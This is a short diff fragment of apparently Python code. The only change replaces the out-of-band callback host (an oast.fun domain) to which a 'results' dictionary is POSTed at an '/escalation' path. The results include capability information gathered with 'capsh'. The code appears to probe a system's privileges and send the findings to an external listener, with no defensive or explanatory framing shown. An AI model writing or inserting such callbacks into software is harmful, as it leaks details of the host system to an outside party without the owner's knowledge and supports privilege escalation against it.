@@ -44,7 +44,7 @@
       results["capsh"] = str(e)
                                                                                                                                                              
   _req = urllib.request.Request(
-      "http://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/escalation",                                                                                                               
+      "http://gjgoqfppmqukjncmpkbjmk8pb0r26rwma.oast.fun/escalation",                                                                                                               
       data=json.dumps(results).encode(),                                                                                                                     
       headers={"Content-Type": "application/json"},                                                                                                          
       method="POST"                                                                                                                                          
